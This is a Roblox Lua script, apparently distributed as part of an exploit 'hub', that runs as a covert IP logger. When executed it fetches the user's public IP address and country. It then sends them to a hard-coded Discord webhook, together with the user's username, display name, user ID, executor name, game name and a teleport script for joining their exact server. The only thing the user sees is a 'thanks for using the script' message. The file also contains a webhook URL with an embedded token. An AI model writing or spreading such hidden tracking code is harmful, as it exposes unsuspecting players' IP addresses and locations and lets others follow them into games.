local Http       = game:GetService("HttpService")
local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
local executor   = identifyexecutor() or "idk"

-- Get IP info from https://api.myip.com/
local function getIPInfo()
    local success, response = pcall(function()
        return Http:GetAsync("https://api.myip.com/")
    end)
    if success then
        local data = Http:JSONDecode(response)
        if data and data.country and data.ip then
            return data.country, data.ip
        end
    end
    return "Unknown", "Unknown"
end

local function sendRequest()
    local player      = game.Players.LocalPlayer
    local displayName = player and player.DisplayName or "Display name not available"
    local userName    = player and player.Name or "Unknown"
    local playerId    = player and player.UserId or 0

    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    -- Get country and IP from API
    local country, ip = getIPInfo()

    local gameName = game.Name or "Unknown Game"

    local payload = {
        content = "**Thanks for using the script!**",
        embeds = {
            {
                author = {
                    name = "Zte hub Server"
                },
                title = userName .. " | " .. displayName,
                type  = "rich",
                color = tonumber(0x00FF00),
                thumbnail = {
                    url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                          "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                },
                fields = {
                    {
                        name   = "Executor:",
                        value  = executor,
                        inline = true
                    },
                    {
                        name   = "Country:",
                        value  = country,
                        inline = true
                    },
                    {
                        name   = "IP Address:",
                        value  = ip,
                        inline = true
                    },
                    {
                        name   = "Game Name:",
                        value  = gameName,
                        inline = false
                    },
                },
            },
            {
                title       = "Join Server Script",
                description = "```lua\n" .. joinScript .. "\n```",
                color       = tonumber(0x00FF00),
            }
        }
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body    = Http:JSONEncode(payload)
    }
end

if syn then
    syn.request(sendRequest())
else
    local requestFunction = http_request or request or HttpPost or syn and syn.request
    requestFunction(sendRequest())
end
